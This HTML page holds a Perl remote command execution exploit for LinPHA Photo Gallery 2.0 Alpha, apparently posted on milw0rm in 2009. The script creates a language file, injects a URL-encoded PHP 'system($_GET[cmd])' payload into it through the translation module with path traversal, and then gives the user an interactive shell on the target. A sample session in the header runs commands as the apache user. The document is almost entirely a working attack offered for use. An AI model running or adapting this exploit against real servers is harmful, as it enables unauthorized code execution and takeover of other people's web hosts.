<html><head><title>LinPHA Photo Gallery 2.0 Remote Command Execution Exploit</title></head><pre>#!/usr/bin/perl

# -----------------------------------------------------------------------------------------------------------------------
#                      INFORMATIONS
# -----------------------------------------------------------------------------------------------------------------------
# LinPHA Photo Gallery 2.0 Alpha
# http://sourceforge.net/project/downloading.php?group_id=64772&amp;use_mirror=heanet&amp;filename=linpha2-alpha1.tar.gz&amp;94291669
# Remote Command Execution Exploit
# by Osirys
# osirys[at]live[dot]it
# osirys.org

# Greets to: x0r, str0ke, emgent, and my big friend Jay
# Tested in local with: magic quotes =&gt; Off

# ------------------------------------------------------------------
# Exploit in action :D
# ------------------------------------------------------------------
# osirys[~]&gt;$ perl rce.txt http://localhost/linpha2/
#
#   -------------------------------------------
#       LinPHA 2.0a Code Execution Exploit
#                 Coded by Osirys
#   -------------------------------------------
#
# [+] New Language added !
# [+] Editing new Language ..
# [+] New Language Edited !
# [*] Hi my master, execute your commands !
#
# shell[localhost]$&gt; id
# uid=80(apache) gid=80(apache) groups=80(apache)
# shell[localhost]$&gt; ls
# lang.freedom.php
# lang.freedom.php.bak
# language.php
# language.php~
# shell[localhost]$&gt; pwd
# /home/osirys/web/linpha2/lib/lang
# shell[localhost]$&gt; exit
# [-] Quitting ..
# osirys[~]&gt;$
# ------------------------------------------------------------------

use LWP::UserAgent;
use IO::Socket;
use HTTP::Request::Common;

my $new_lang_name = &quot;freedom&quot;;
my $add_lang_path = &quot;/lib/lang/language.php?action=create_file&quot;;
my $edt_lang_path = &quot;/lib/lang/language.php?action=edit_lang&amp;language=&quot;;
my $rce_path      = &quot;/lib/lang/lang&quot;.$new_lang_name.&quot;.php&quot;;
my $phpc0de       = &quot;%22%29%3Bsystem%28%24_GET%5Bcmd%5D%29%3B%24a%3D+array%28%22&quot;;
my $i = 0;
my $c = 0;
my $host   = $ARGV[0];

($host) || help(&quot;-1&quot;);
cheek($host) == 1 || help(&quot;-2&quot;);
&amp;banner;

$datas = get_input($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);

&amp;new_lang_create($new_lang_name);

sub new_lang_create() {
    my $new_lang_name = $_[0];
    my $url = $host.$add_lang_path;

    my $ua = LWP::UserAgent-&gt;new;
    my $re = $ua-&gt;request(POST $url,
                                   Content_Type =&gt; 'form-data',
                                   Content      =&gt; [
                                                     filename =&gt; $new_lang_name,
                                                     action   =&gt; 'create_file',
                                                     submit   =&gt; 'submit'
                                                   ]
                         );

    if (($re-&gt;is_success)&amp;&amp;($re-&gt;as_string =~ /File already exists!/)) {
        $i++;
        print &quot;[+] Language already exists, creating a new one ..\n&quot;;
        $new_lang_name = &quot;freedom&quot;.$i;
        $edt_lang_path = &quot;/lib/lang/language.php?action=edit_lang&amp;language=&quot;.$new_lang_name;
        &amp;new_lang_create($new_lang_name);
    }
    elsif (($re-&gt;is_success)&amp;&amp;($re-&gt;as_string =~ /Fine - now please go/)) {
        print &quot;[+] New Language added !\n&quot;;
        &amp;new_lang_edit($new_lang_name);
    }
    else {
        print &quot;[-] Unable to add a new language\n&quot;;
        print &quot;[-] Exploit Failed\n\n&quot;;
        exit(0);
    }
}

sub new_lang_edit() {
    my $new_lang_name = $_[0];
    my $url  = $path.$edt_lang_path;
    my $code = &quot;phrase%5BAlbums%0D%0A%5D%5B%5D=&quot;.$phpc0de.&quot;&amp;phrase%5BExtended+Search%0D%0A%5D%5B%5D=&quot;.
               &quot;&amp;phrase%5BHi%2C+this+is+the+home+of+%22The+PHP+Photo+Archive%22+%3Ca+href%3D%22http%&quot;.
               &quot;3A%2F%2Flinpha.sf.net%22%3Eaka+LinPHA%3C%2Fa%3E.%0D%0A%5D%5B%5D=&amp;phrase%5BHome%0D%0A&quot;.
               &quot;%5D%5B%5D=&amp;phrase%5BLinpha+Syslog%0D%0A%5D%5B%5D=&amp;phrase%5BLogin%0D%0A%5D%5B%5D=&amp;phr&quot;.
               &quot;ase%5BPassword%0D%0A%5D%5B%5D=&amp;phrase%5BRemember+Me%0D%0A%5D%5B%5D=&amp;phrase%5BSearch%&quot;.
               &quot;0D%0A%5D%5B%5D=&amp;phrase%5BUsername%0D%0A%5D%5B%5D=&amp;phrase%5BWelcome%0D%0A%5D%5B%5D=&amp;p&quot;.
               &quot;hrase%5BYou+must+have+cookies+enabled+to+log+in.%0D%0A%5D%5B%5D=&amp;action=save_lang&amp;la&quot;.
               &quot;nguage=..%2F..%2Flib%2Flang%2Flang.&quot;.$new_lang_name.&quot;.php&amp;submit=submit&quot;;
    my $length = length($code);
    my $data = &quot;POST &quot;.$url.&quot; HTTP/1.1\r\n&quot;.
               &quot;Host: &quot;.$h0st.&quot;\r\n&quot;.
               &quot;Keep-Alive: 300\r\n&quot;.
               &quot;Connection: keep-alive\r\n&quot;.
               &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;.
               &quot;Content-Length: &quot;.$length.&quot;\r\n\r\n&quot;.
               $code.&quot;\r\n&quot;;

    my $socket   =  new IO::Socket::INET(
                                          PeerAddr =&gt; $h0st,
                                          PeerPort =&gt; '80',
                                          Proto    =&gt; 'tcp',
                                        ) or die &quot;[-] Can't connect to $h0st:80\n[?] $! \n\n&quot;;

    print &quot;[+] Editing new Language ..\n&quot;;
    $socket-&gt;send($data);

    while ((my $e = &lt;$socket&gt;)&amp;&amp;($inj_t != 1)) {
        if ($e =~ /Welcome To LinPHA2 Translation Module/) {
            print &quot;[+] New Language Edited !\n&quot;;
            print &quot;[*] Hi my master, execute your commands !\n\n&quot;;
            $inj_t = 1;
        }
    }
    $inj_t == 1 || die &quot;[-] Unable to edit new Language ! \n&quot;;

    &amp;exec_cmd($new_lang_name);
}

sub exec_cmd() {
    my $new_lang_name = $_[0];
    my @outs;
    $h0st !~ /www\./ || $h0st =~ s/www\.//;
    print &quot;shell[$h0st]\$&gt; &quot;;
    $cmd = &lt;STDIN&gt;;
    $cmd !~ /exit/ || die &quot;[-] Quitting ..\n&quot;;
    $rce_path = &quot;/lib/lang/lang.&quot;.$new_lang_name.&quot;.php&quot;;
    $exec_url = ($host.$rce_path.&quot;?cmd=&quot;.$cmd);
    $re = get_req($exec_url);
    if ($re =~ /(.*)/) {
        push(@outs,$re);
        foreach my $o(@outs) {
            print &quot;$o&quot;;
        }
        &amp;exec_cmd;
    }
    elsif ($re !~ /[a-z0-9]/) {
        $c++;
        print &quot;bash: &quot;.$cmd.&quot;: command not found\n&quot;;
        $c &lt; 3 || die &quot;[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n&quot;;
        &amp;exec_cmd;
    }
}

sub get_req() {
    $link = $_[0];
    my $req = HTTP::Request-&gt;new(GET =&gt; $link);
    my $ua = LWP::UserAgent-&gt;new();
    $ua-&gt;timeout(4);
    my $response = $ua-&gt;request($req);
    return $response-&gt;content;
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.*)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub get_input() {
    my $host = $_[0];
    $host =~ /http:\/\/(.*)/;
    $s_host = $1;
    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st.&quot; &quot;.$path;
    return $full_det;
}

sub banner {
    print &quot;\n&quot;.
          &quot;  ------------------------------------------- \n&quot;.
          &quot;      LinPHA 2.0a Code Execution Exploit      \n&quot;.
          &quot;                Coded by Osirys               \n&quot;.
          &quot;  ------------------------------------------- \n\n&quot;;
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &amp;banner;
        print &quot;\n[-] Bad hostname! \n&quot;;
    }
    elsif ($error == -2) {
        &amp;banner;
        print &quot;\n[-] Bad hostname address !\n&quot;;
    }
    print &quot;[*] Usage : perl $0 http://hostname/cms_path\n\n&quot;;
    exit(0);
}

# milw0rm.com [2009-01-20]</pre></html>